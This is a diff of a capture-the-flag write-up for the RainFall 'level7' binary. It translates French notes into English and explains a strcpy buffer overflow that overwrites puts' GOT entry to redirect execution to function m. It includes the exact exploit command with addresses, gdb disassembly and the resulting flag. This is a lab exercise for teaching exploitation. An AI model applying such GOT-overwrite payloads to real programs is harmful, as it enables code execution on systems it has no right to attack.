@@ -27,7 +27,6 @@ gs             0x33	51
 0x80486e9:	 "r"
 
 
-
 (gdb) disas main 
 Dump of assembler code for function main:
    0x08048521 <+0>:	push   %ebp
@@ -102,30 +101,23 @@ objdump -t ./level7  | grep ".text"
 08048521 g     F .text	000000e2              main
 
 
-
-./level7 $(python -c 'print "A" * 20 + "\x28\x99\x04\x08"')
-$(python -c 'print "\xf4\x84\x04\x08"')
-5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9
- - 1642785922
-
-La faille vient de strcpy, c'est un buffer overflow.
-strcpy n'est pas protege et ne verifie pas la taille de ce qu'il va copier
-Pour passer le premier strcpy on sait que le buffer peut contenir 20 bytes, on
-peut le confirmer en voyant qu'avec 21 il segfault :
+The exploit comes from the strcpy, it's a buffer overflow.
+strcpy isn't protected and doesn't check for the size of its argument.
+To pass the first strcpy we know that the buffer can contain only 20 bytes, we
+can confirm that by sending 21 bytes and getting a segfault :
 
 ./level7 $(python -c 'print "A" * 21') "BBBB"
 Segmentation fault (core dumped)
 level7@RainFall:~$ ./level7 $(python -c 'print "A" * 20') "BBBB"
-~~
 
-Avec le premier argument on se place sur l'addresse GOT de puts.
-Comme RELRO n'est pas actif on peut ecrire sur GOT.
-Le 2nd strcpy permet lui d'ecrire sur le pointeur de strcpy (1) l'addresse de 
-la fonction m que l'on souhaite executer.
-Ainsi, lors de l'execution du programme l'appel de puts qui va chercher "sa 
-vraie" addresse sur la table PLT est enfait l'addresse de m qui est ensuite
-executer et nous permet d'avoir le flag.
 
+With the first argument we go to the puts'GOT address.
+As RELRO isn't activated we can write on the GOT.
+2nd strcpy write to the pointer of strcpy (1) the address of the m function, 
+the one we want to execute.
+Then, we executing the level7 puts call will look for its "read" address on
+the PLT table which is in factt m's address which will be executed next.
+This allow us to get the flag.
 
 gdb) disas 0x8048400
 Dump of assembler code for function puts@plt:
@@ -139,3 +131,8 @@ Dump of assembler code for function puts@got.plt:
    0x08049929 <+1>:	test   %al,(%eax,%ecx,1)
 End of assembler dump.
 
+
+./level7 $(python -c 'print "A" * 20 + "\x28\x99\x04\x08"')
+$(python -c 'print "\xf4\x84\x04\x08"')
+5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9
+ - 1642785922
